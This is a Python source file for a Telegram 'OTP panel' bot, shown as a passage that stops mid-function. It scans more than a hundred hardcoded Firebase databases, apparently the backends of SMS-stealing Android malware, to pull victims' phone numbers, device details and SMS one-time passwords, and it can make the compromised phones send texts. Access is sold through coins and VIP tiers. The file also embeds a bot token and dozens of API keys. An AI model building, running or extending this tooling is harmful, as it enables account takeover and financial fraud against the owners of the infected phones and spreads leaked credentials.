#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
  OTP PANEL BOT — PRIVATE ADMIN EDITION           
  ULTRA-SPEED PROGRESSIVE SCANNER & NON-BLOCKING UI
  (RAILWAY OPTIMIZED EDITION - FINAL FIX)
══════════════════════════════════════════════════════
"""

import os
import re
import sys
import time
import json
import random
import asyncio
import logging
import warnings
import traceback
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# 🔥 Hide default HTTP & DNS logs for a clean terminal
warnings.filterwarnings("ignore", category=DeprecationWarning)
logging.basicConfig(
    format="%(asctime)s — %(levelname)s — %(message)s",
    level=logging.WARNING, 
)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# ═══════════════════════════════════════════════════════
#  AUTO-EXTRACTOR: READS ALL LOCAL JSON FILES FOR FIREBASE URLS
# ═══════════════════════════════════════════════════════

def extract_urls_from_local_files() -> list:
    extracted_urls = set()
    pattern = re.compile(r'https?://[a-zA-Z0-9-]+\.(?:firebaseio\.com|[a-zA-Z0-9-]+\.firebasedatabase\.app)')
    
    current_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in globals() else '.'
    
    for filename in os.listdir(current_dir):
        if filename.endswith('.json') and filename not in ['settings.json']:
            filepath = os.path.join(current_dir, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    matches = pattern.findall(content)
                    extracted_urls.update(matches)
            except Exception:
                pass
                
    return list(extracted_urls)

# ═══════════════════════════════════════════════════════
#  CONFIG & FULL FIREBASE URLS
# ═══════════════════════════════════════════════════════

HARDCODED_URLS = [
    "https://aaaa-b3749-default-rtdb.firebaseio.com", "https://aashish-2e04c-default-rtdb.firebaseio.com",
    "https://aaya-6e335-default-rtdb.firebaseio.com", "https://aaya2-8df9a-default-rtdb.firebaseio.com",
    "https://access20-3fc38-default-rtdb.firebaseio.com", "https://activity-e16b3-default-rtdb.firebaseio.com",
    "https://admin-822e2-default-rtdb.firebaseio.com", "https://admin-panel-2272-default-rtdb.firebaseio.com",
    "https://ai-rto-9-default-rtdb.firebaseio.com", "https://airto-abde2-default-rtdb.firebaseio.com",
    "https://aiye-a-rajesh-default-rtdb.firebaseio.com", "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "https://ajna-20fc4-default-rtdb.firebaseio.com", "https://alfabomber-c746b-default-rtdb.firebaseio.com",
    "https://alpha-af0d2.firebaseio.com", "https://amirrr-8a463-default-rtdb.firebaseio.com",
    "https://anamikaadminpanel-default-rtdb.firebaseio.com", "https://ankur-2511f-default-rtdb.firebaseio.com",
    "https://annapunna-12b79-default-rtdb.firebaseio.com", "https://anvith6-9450e-default-rtdb.firebaseio.com",
    "https://apkdriod-default-rtdb.firebaseio.com", "https://apkdriod-f6fb9-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com", "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "https://asdtest-project-default-rtdb.firebaseio.com", "https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
    "https://aya-wed-anvith-default-rtdb.firebaseio.com", "https://babu-2b2c2-default-rtdb.firebaseio.com",
    "https://badboys-16296-default-rtdb.firebaseio.com", "https://bandhan2-7jan-default-rtdb.firebaseio.com",
    "https://bank-e-kyc-default-rtdb.firebaseio.com", "https://bihar-chandan-c2af8-default-rtdb.firebaseio.com",
    "https://bihar-new-770fb-default-rtdb.firebaseio.com", "https://biharnew-2380d-default-rtdb.firebaseio.com",
    "https://biharnew2-default-rtdb.firebaseio.com", "https://billojii-default-rtdb.firebaseio.com",
    "https://bittu-2d39e-default-rtdb.firebaseio.com", "https://bob-4-a4078-default-rtdb.firebaseio.com",
    "https://boi-3-8914d-default-rtdb.firebaseio.com", "https://bossuun-default-rtdb.firebaseio.com",
    "https://bu-3-13-default-rtdb.firebaseio.com", "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com", "https://can-4-668a0-default-rtdb.firebaseio.com",
    "https://challan5-default-rtdb.firebaseio.com", "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "https://chhnuk05-3188e-default-rtdb.firebaseio.com", "https://ck-kumar3-default-rtdb.firebaseio.com",
    "https://colana-84ce2-default-rtdb.firebaseio.com", "https://comeback-5b876-default-rtdb.firebaseio.com",
    "https://cs23-9e709-default-rtdb.firebaseio.com", "https://cs2xc-3951e-default-rtdb.firebaseio.com",
    "https://cs6mycarry68jh-default-rtdb.firebaseio.com", "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "https://csk-41-default-rtdb.firebaseio.com", "https://cust-4-a7670-default-rtdb.firebaseio.com",
    "https://cust-6-default-rtdb.firebaseio.com", "https://customer03support-default-rtdb.firebaseio.com",
    "https://dark-274b4-default-rtdb.firebaseio.com", "https://darknet-26b68-default-rtdb.firebaseio.com",
    "https://davil-d4e77-default-rtdb.firebaseio.com", "https://demon-4-default-rtdb.firebaseio.com",
    "https://desi-742d2-default-rtdb.firebaseio.com", "https://desi-balak2-default-rtdb.firebaseio.com",
    "https://dev-rahul-3ca89-default-rtdb.firebaseio.com", "https://dhani-aa151-default-rtdb.firebaseio.com",
    "https://dhheee-b95dc-default-rtdb.firebaseio.com", "https://djjd-22e61-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com", "https://doxci-9daa3-default-rtdb.firebaseio.com",
    "https://drugi-numer.firebaseio.com", "https://duuu-dc41d-default-rtdb.firebaseio.com",
    "https://dwala-3d1ff-default-rtdb.firebaseio.com", "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "https://e10ttqaq-default-rtdb.firebaseio.com", "https://e14turnament2-default-rtdb.firebaseio.com",
    "https://e5turnament2-default-rtdb.firebaseio.com", "https://egale-74-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com", "https://fir-27c9e-default-rtdb.firebaseio.com",
    "https://fir-408f9-default-rtdb.firebaseio.com", "https://fires-847da-default-rtdb.firebaseio.com",
    "https://flash-v7powerengine-v7-default-rtdb.firebaseio.com", "https://flashbomber-18413-default-rtdb.firebaseio.com",
    "https://fortydata-fee65-default-rtdb.firebaseio.com", "https://fpro3indus-default-rtdb.firebaseio.com",
    "https://gaandkiaand-default-rtdb.firebaseio.com", "https://gas56-5d2b9-default-rtdb.firebaseio.com",
    "https://gggggg-979bd-default-rtdb.firebaseio.com", "https://gghhh-35b79-default-rtdb.firebaseio.com",
    "https://giagas2-default-rtdb.firebaseio.com", "https://gjhghjj-3d251-default-rtdb.firebaseio.com",
    "https://go-one-1b6b2-default-rtdb.firebaseio.com", "https://gren-ff2af-default-rtdb.firebaseio.com",
    "https://h-5-12-default-rtdb.firebaseio.com", "https://hch-cj-default-rtdb.firebaseio.com",
    "https://hdhe-4dad5-default-rtdb.firebaseio.com", "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
    "https://hdmax1-58366-default-rtdb.firebaseio.com", "https://hehe-679dd-default-rtdb.firebaseio.com",
    "https://hello-6153b-default-rtdb.firebaseio.com", "https://hopkhfg-9981a-default-rtdb.firebaseio.com",
    "https://hospital-8707c-default-rtdb.firebaseio.com", "https://hsm2pro21-default-rtdb.firebaseio.com",
    "https://igii-1d529-default-rtdb.firebaseio.com", "https://imdum-6e873-default-rtdb.firebaseio.com",
    "https://indus-1-cec4f-default-rtdb.firebaseio.com", "https://inf-flash-default-rtdb.firebaseio.com",
    "https://jaduopop-a9a12-default-rtdb.firebaseio.com", "https://jamtar7-95f77-default-rtdb.firebaseio.com",
    "https://jamtara118-7cd20-default-rtdb.firebaseio.com", "https://jamtara123-42608-default-rtdb.firebaseio.com",
    "https://jamtara133-61d7e-default-rtdb.firebaseio.com", "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "https://jamtara150-62b22-default-rtdb.firebaseio.com", "https://jamtara181-default-rtdb.firebaseio.com",
    "https://jamtara32-4a5f1-default-rtdb.firebaseio.com", "https://jamtara74-c231e-default-rtdb.firebaseio.com",
    "https://jayma-9ce22-default-rtdb.firebaseio.com", "https://jeet-op-default-rtdb.firebaseio.com",
    "https://jjkkkk-a6cad-default-rtdb.firebaseio.com", "https://jsjsjs-20d84-default-rtdb.firebaseio.com",
    "https://juhiishita786-67829-default-rtdb.firebaseio.com", "https://kanha-3bf53-default-rtdb.firebaseio.com",
    "https://karishmacsc-42128-default-rtdb.firebaseio.com", "https://kha-hai-default-rtdb.firebaseio.com",
    "https://kingbggbb-default-rtdb.firebaseio.com", "https://kisi-d6da8-default-rtdb.firebaseio.com",
    "https://kitter-34345-default-rtdb.firebaseio.com", "https://kitter-rajk8-default-rtdb.firebaseio.com",
    "https://kituu36-58290-default-rtdb.firebaseio.com", "https://komaljah-default-rtdb.firebaseio.com",
    "https://kumarlive1-default-rtdb.firebaseio.com", "https://kumu-f2257-default-rtdb.firebaseio.com",
    "https://lalanashish2-default-rtdb.firebaseio.com", "https://lalannew-9392c-default-rtdb.firebaseio.com",
    "https://lalannew5-default-rtdb.firebaseio.com", "https://lalansale-default-rtdb.firebaseio.com",
    "https://lalit-7b538-default-rtdb.firebaseio.com", "https://lawrence-7b55f-default-rtdb.firebaseio.com",
    "https://le-bhaii-default-rtdb.firebaseio.com", "https://loda-5029e-default-rtdb.firebaseio.com",
    "https://loda-9358c-default-rtdb.firebaseio.com", "https://lovefimus-default-rtdb.firebaseio.com",
    "https://maik-31440-default-rtdb.firebaseio.com", "https://mano99-default-rtdb.firebaseio.com",
    "https://manuwa-bb70a-default-rtdb.firebaseio.com", "https://maxa29-f652e-default-rtdb.firebaseio.com",
    "https://mayor-6f08c-default-rtdb.firebaseio.com", "https://mera-wala-71a5e-default-rtdb.firebaseio.com",
    "https://mera5-a7138-default-rtdb.firebaseio.com", "https://mithun-3d803-default-rtdb.firebaseio.com",
    "https://mman-433ae-default-rtdb.firebaseio.com", "https://mmmm-f7678-default-rtdb.firebaseio.com",
    "https://money-ace2c-default-rtdb.firebaseio.com", "https://mp-24jfg-default-rtdb.firebaseio.com",
    "https://mpari-6a6e5-default-rtdb.firebaseio.com", "https://muajob-29c86-default-rtdb.firebaseio.com",
    "https://mun4-ff5d4-default-rtdb.firebaseio.com", "https://myabtar-default-rtdb.firebaseio.com",
    "https://myadmin-38635-default-rtdb.firebaseio.com", "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://mypanelbot-default-rtdb.firebaseio.com", "https://navin512-54d6f-default-rtdb.firebaseio.com",
    "https://newappi-7661a-default-rtdb.firebaseio.com", "https://newspreding-default-rtdb.firebaseio.com",
    "https://nky0-a5870-default-rtdb.firebaseio.com", "https://nn02-7189f-default-rtdb.firebaseio.com"
]

LOCAL_URLS = extract_urls_from_local_files()
RAW_URLS = list(set(HARDCODED_URLS + LOCAL_URLS))
DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}

POLL_INTERVAL   = 3  
SMS_LIMIT       = 20       
TOKEN           = "8218848065:AAFw5snj5NTWbayoXSHHIaNEg-vFPuXGm-4"
BOT_USERNAME    = "freepanelssmsbot"
PAGE_SIZE       = 10

ADMIN_IDS: set[int] = {
    6860106371,   
}

# 🔥 FIXED: Changed to absolute path for Railway Volume Mount
BASE_DIR = os.getenv("RAILWAY_VOLUME_MOUNT_PATH", os.path.dirname(os.path.abspath(__file__)))
DB_DIR = os.path.join(BASE_DIR, "Panel_Databases")
USERS_DIR = os.path.join(DB_DIR, "Users")
CLONES_DIR = os.path.join(DB_DIR, "Clones")
SYS_DIR = os.path.join(DB_DIR, "System")
SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")

# ═══════════════════════════════════════════════════════
#  GLOBAL STATE, QUEUE, CACHE & PROGRESS TRACKER
# ═══════════════════════════════════════════════════════

seen_ids:  set[str] = set()   
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None
start_time = time.time()
total_otps_processed = 0

user_seen_unreg: dict[int, set[str]] = {}
user_fresh_cache: dict[int, list[str]] = {}
all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
chats_registry: dict[str, set[int]] = {TOKEN: set()} 

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}

# 🔥 LIVE PROGRESS TRACKER
SCAN_PROGRESS = {"total": 1, "completed": 1}

SETTINGS = {
    "base_price": 30,
    "global_panels": []
}

# 🔥 FIXED SEMAPHORES FOR WINDOWS Limits (max 300)
HTTP_SEMAPHORE = asyncio.Semaphore(300)
WORKER_SEMAPHORE = asyncio.Semaphore(300)

API_LOCK = asyncio.Lock()
PREFETCH_POOL: dict[str, list] = {}
PREFETCH_TASKS: dict[str, asyncio.Task] = {}

SYS_SETTINGS = {
    "api_keys": [
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74", "AK_82DbShpWkA6_Ctln35D7d7jOzWOQkJk7",
        "AK_Z67i7aPkuL4Iid7Vq8OgOuJb7ewNZy4K", "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-", "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM", "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
        "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x", "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
        "AK_Y6tDZmfylYdDchpsSbyqzu5YuD1bnbNo", "AK_bC4UzJNUG4Yk8TtT3mxqxNJ6oIPLiBfh",
        "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3",
        "AK_16LERGicFB6uncWbhCjeE9uD-UHjrFsA", "AK_0damiG8gnn6xBLe3__JBfcvH_rJh686E",
        "AK_gvRJyMC_byA4xamTOrRsWiNEHPrs_QS1", "AK_YvD2v66Ue-YlZ-Hu18s3NvNaL2vql2r3",
        "AK_5QuS_fHqe6eE-zTaZ_fDclt29D9yMDgE", "AK_xY9PPRI388wiXjpbRQWCQrc5jA9mBrAa",
        "AK_KY-Lvl-_x7-t8hQlzuSwI3s2fBooCJAd", "AK_Pg_J42kDmN2gazXPgCZlxNt6fsfnOlCT",
        "AK_R5xBtr0Mejw-0a54j-gTxh8feMjQZcOn", "AK_9CXg3dKl-IxLDIerpMzhd-KVE3HCMCso",
        "AK_7Mif5BId_Iz5rjpKD6Fc2k6DX7mqCEyU", "AK__OdSNA9Dq-3YJEueBT1-OcnRiJGkN1Y0",
        "AK_LnxgclktRe50Phzzwcon4kltxFtxx2vJ", "AK_8NlERdLgolrFdeddI3sMrjZG8bICRHoF",
        "AK_3pTIVB1bG172ZlXmch3ICqCNcRyx8gwA", "AK_etId74tu1V75auJXiq1Y_jV9H9lsQ4am",
        "AK_YIpYpHNlCNnjLeSUdkA-lqSGZ94nppjt", "AK_QLZXoprRieTkAZlgERxHdr9I1sL3bGP_",
        "AK_-08LOerb6jaCx52JmjDC0pMWhNzgVRbZ", "AK_mS7CAb1vPUnhQorNuxDgV_xfNN2kyoGW",
        "AK_LncxU9pi2mte200towYPh-ae2FcrMO9j", "AK_7DTjFAVezVWUvSvI4Ni-3_0L1t3uNwbw",
        "AK_UGc1SjKM7pWUiub6xq3n-wTXa4p_Jrse", "AK_NuDV1z5xOi0uT7fxks4TfA0I0iPBbiFM",
        "AK_NwhgeV64GrdGFoSaFj7LbqiieQObi55o", "AK_T2uFNlEPzaKT3OeIROc9FVYpYhYeFjma",
        "AK_PD7Nc8H2a0DNwENQmlflKvCBEow30UD9", "AK_Htire7-fPlEdEMNAdtkQ0wZ0NS4ttbaz",
        "AK_r8Sk4b7UzPf_DhbM_-tjVe1moW1iRLy5", "AK_EifnL8Bx6DfCIGRJGikPvPoYNkmpvTqF",
        "AK_I6lx-tDgEJA0P_jP1foxgM2eUO5F-tJd", "AK_VqzDvRR4oJyG_zBZmHSjX2f57Z4dngfy",
        "AK_5pvQYHaqr_71s4Wq0-_tRvgJBBscn6xB", "AK_1JbT6popnOVlIO929J9Y2Z0-gyHUCXdL",
        "AK_PrWss32JjoP7nv6ttNOP0d3RYynqslug", "AK_ldeMT-eBQ2whhXvakm9frq59bmxYNo1Y",
        "AK_dQhyxP4BsTbEIQ1s_VgXJkt4up4IX9UV", "AK_ak1Fy5vvoXhFInwSunFWEBz3SAuEltiO",
        "AK_80VoNRC8pkOHI7Kbpe7ybvWcTq2ktuWO", "AK_n3rVdC1y5fIRJDLosvsNzQimr16D-zmr",
        "AK_VuokZpsT91F2-TzrO13RQZ3BTOF1VOlA", "AK_GGulMMNAcqKRf8BAXQfzlesaozh917Re",
        "AK_JDvMk7HIq4yhD1NvEZ0bRRgdnjyUrK_M", "AK_suKV-7E1peiwoxFLoi67ENmraj0mKRkE",
        "AK_H2puTEPDk4cZ9LnW_vq-wdhjS7pMihgb", "AK_1yxxKAYrCLdun4jOSejUckG58QokfbPb",
        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
    ],
    "check_anim": "⚡"
}

# ═══════════════════════════════════════════════════════
#  DATA CLASSES
# ═══════════════════════════════════════════════════════

class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag", "last_sms_ts"
    )
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag, last_sms_ts=0.0):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag
        self.last_sms_ts = last_sms_ts

# ═══════════════════════════════════════════════════════
#  INDIVIDUAL FILE DATA SYSTEM
# ═══════════════════════════════════════════════════════

def init_dirs():
    os.makedirs(USERS_DIR, exist_ok=True)
    os.makedirs(CLONES_DIR, exist_ok=True)
    os.makedirs(SYS_DIR, exist_ok=True)
    if not os.path.exists(SMS_LOG_FILE):
        with open(SMS_LOG_FILE, "w", encoding="utf-8") as f:
            f.write("--- SYSTEM MASTER SMS LOG ---\n")

def load_data():
    global all_users, CLONES, SETTINGS
    init_dirs()
    
    set_path = os.path.join(SYS_DIR, "settings.json")
    if os.path.exists(set_path):
        try:
            with open(set_path, "r", encoding="utf-8") as f:
                SETTINGS.update(json.load(f))
        except: pass

    for fname in os.listdir(USERS_DIR):
        if fname.endswith(".json"):
            try:
                uid = int(fname.split(".")[0])
                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f:
                    all_users[uid] = json.load(f)
            except: pass
                
    for fname in os.listdir(CLONES_DIR):
        if fname.endswith(".json"):
            try:
                with open(os.path.join(CLONES_DIR, fname), "r", encoding="utf-8") as f:
                    cdata = json.load(f)
                    restored_users = {int(k): v for k, v in cdata.get("users", {}).items()}
                    cdata["users"] = restored_users
                    token = cdata.get("bot_token")
                    if token:
                        CLONES[token] = cdata
            except: pass
            
    for adm in ADMIN_IDS:
        if adm in all_users:
            all_users[adm]["global_spam"] = False 
            save_user(adm)
        if adm not in all_users:
            all_users[adm] = {
                "name": "Supreme Owner",
                "username": "",
                "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
                "verified": True,
                "referrals": 0,
                "coins": 999999,
                "vip_until": 2e10,
                "vip_paused_left": 0.0,
                "vip_expired_purchases": 0,
                "bot_expired_purchases": 0,
                "pdb_expired_purchases": 0,
                "otp_count": 0,
                "bots_created": 0,
                "bonus_10_received": True,
                "global_spam": False, 
                "custom_dbs": [],
                "selected_panel": "ALL",
                "transactions": [],
                "referred_by": None,
                "banned": False
            }
            save_user(adm)

def save_user(uid: int):
    init_dirs()
    if uid in all_users:
        with open(os.path.join(USERS_DIR, f"{uid}.json"), "w", encoding="utf-8") as f:
            json.dump(all_users[uid], f, indent=4)

def save_clone(token: str):
    init_dirs()
    if token in CLONES:
        safe_name = token.replace(":", "_")
        data = CLONES[token].copy()
        data["bot_token"] = token 
        data.pop("app", None) 
        with open(os.path.join(CLONES_DIR, f"{safe_name}.json"), "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)

def save_settings():
    init_dirs()
    with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=4)

def _sync_save_data():
    save_settings()
    for uid in list(all_users.keys()):
        save_user(uid)
    for token in list(CLONES.keys()):
        save_clone(token)

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def master_log_sms(number: str, message: str, otp: str):
    try:
        t = datetime.now().strftime("%d-%b-%Y %I:%M:%S %p")
        log_line = f"[{t}] NUM: {number} | OTP: {otp or 'N/A'} | MSG: {message}\n"
        with open(SMS_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_line)
    except: pass

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)
        await save_data_async()

# ═══════════════════════════════════════════════════════
#  ANTI-SPAM & UTILS
# ═══════════════════════════════════════════════════════

def get_user_dbs(uinfo: dict) -> list:
    dbs = uinfo.get("custom_dbs", [])
    valid_urls = []
    now = time.time()
    for db in dbs:
        if isinstance(db, str): 
            valid_urls.append(db)
        elif isinstance(db, dict) and db.get("expiry", 0) > now:
            valid_urls.append(db["url"])
            
    if isinstance(uinfo.get("custom_db"), str) and uinfo["custom_db"] not in valid_urls:
        valid_urls.append(uinfo["custom_db"])
        
    return list(set(valid_urls))

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 1.0:  
        return True
    user_cooldowns[user_id] = now
    return False

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err_str = str(context.error)
    ignore_errors = [
        "Forbidden", "Chat not found", "bot was blocked", "not modified", 
        "Message to edit not found", "ChatNotFound", "ReadError", "NetworkError", 
        "TimedOut", "Event loop is closed", "gaierror"
    ]
    if any(e in err_str for e in ignore_errors):
        return
    if re.match(r"^-?\d+$", err_str.strip()): 
        return
    pass

# ═══════════════════════════════════════════════════════
#  FAST HTTP SESSION MANAGER 
# ═══════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=300, use_dns_cache=True, ttl_dns_cache=300)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    async with HTTP_SEMAPHORE:
        try:
            session = await get_http_session()
            url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
            if not path: url = url.replace("?shallow=true", ".json")
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2.5)) as r:
                if r.status != 200: return None
                try:
                    data = await r.json(content_type=None)
                    return data if isinstance(data, dict) else None
                except Exception:
                    return None
        except Exception:
            return None

async def fb_keys(path: str, base: str) -> list[str]:
    async with HTTP_SEMAPHORE:
        try:
            session = await get_http_session()
            url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=2.5)) as r:
                if r.status != 200: return []
                try:
                    data = await r.json(content_type=None)
                    return list(data.keys()) if isinstance(data, dict) else []
                except Exception:
                    return []
        except Exception:
            return []

async def check_number_api(service: str, number: str, retries=2) -> dict:
    clean_number = re.sub(r"\D", "", str(number))[-10:]
    api_keys = SYS_SETTINGS.get("api_keys", [])
    if not api_keys: return {"status": "error", "message": "No API Keys configured.", "ms": 0}

    for attempt in range(retries):
        async with API_LOCK:
            if not hasattr(check_number_api, 'k_idx'): check_number_api.k_idx = 0
            selected_key = api_keys[check_number_api.k_idx % len(api_keys)]
            check_number_api.k_idx += 1

        payload = {"service": service.lower(), "number": clean_number}
        start_req = time.time()
        try:
            session = await get_http_session()
            async with session.post(
                "https://superassets.in/api/v1/check", 
                json=payload, 
                headers={"X-API-Key": selected_key, "Content-Type": "application/json"}, 
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                req_ms = int((time.time() - start_req) * 1000)
                if r.status == 200: 
                    res = await r.json()
                    res["ms"] = req_ms
                    return res
                elif r.status == 429:
                    await asyncio.sleep(1)
                    continue
                else: 
                    return {"status": "error", "message": f"HTTP {r.status}", "ms": req_ms}
        except Exception as e: 
            if attempt == retries - 1:
                return {"status": "error", "message": "Timeout", "ms": int((time.time() - start_req) * 1000)}
            await asyncio.sleep(0.5)

async def fb_send_sms(device, to_number: str, msg: str):
    async with HTTP_SEMAPHORE:
        try:
            base_node = device.sms_path.replace("/sms", "").replace("user_sms", "user_data")
            send_url = f"{device.base_url}/{base_node}/sendSMS.json"
            
            payload = {
                "number": to_number,
                "phone": to_number,
                "phoneNo": to_number,
                "message": msg,
                "msg": msg,
                "text": msg,
                "status": "pending"
            }
            session = await get_http_session()
            async with session.post(send_url, json=payload, timeout=aiohttp.ClientTimeout(total=2)) as r:
                pass
        except:
            pass

# ═══════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def extract_all_nums(*dicts) -> list[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "sim1", "sim2", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 4:
                nums.append(fmt_num(val))
    return list(set(nums))

def bat_emoji(pct: int) -> str:
    return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})",        re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})",       re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})",   re.IGNORECASE),
    re.compile(r"\b(G-\d{6})\b",             re.IGNORECASE), 
    re.compile(r"\b([A-Z0-9]{5,8})\b",       re.IGNORECASE), 
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    if not text: return None
    t_lower = text.lower()
    if any(x in t_lower for x in ["block", "rs.", "bal", "balance", "debited", "credited"]):
        m = re.search(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", t_lower)
        if m: return m.group(1)
        return None
    for pat in OTP_PATTERNS:
        m = re.search(pat, text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

def device_label(d: 'Device') -> str:
    if d.numbers: return " & ".join(d.numbers)
    return f"{d.name} ({d.id[:8]})"

# ═══════════════════════════════════════════════════════
#  FIREBASE DATA FETCHERS 
# ═══════════════════════════════════════════════════════

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    async with WORKER_SEMAPHORE:
        devices_list = []
        added_set = set()
        try:
            root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
                fb_keys("", url), fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
                fb_get("user_data", url), fb_get("clients", url)
            )
            if sim_all and isinstance(sim_all, dict):
                info_all = device_info_all or {}
                for dev_id, sim in sim_all.items():
                    if dev_id in added_set: continue
                    added_set.add(dev_id)
                    info = info_all.get(dev_id) or {}
                    nums = extract_all_nums(sim, info)
                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                    devices_list.append(Device(
                        id=dev_id, name=model, status=parse_status_str(info.get("Status")),
                        battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or sim.get("timestamp") or 0),
                        numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}",
                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
                    ))
            if user_data_all and isinstance(user_data_all, dict):
                for dev_id, data in user_data_all.items():
                    if dev_id in added_set: continue
                    if not isinstance(data, dict): continue
                    added_set.add(dev_id)
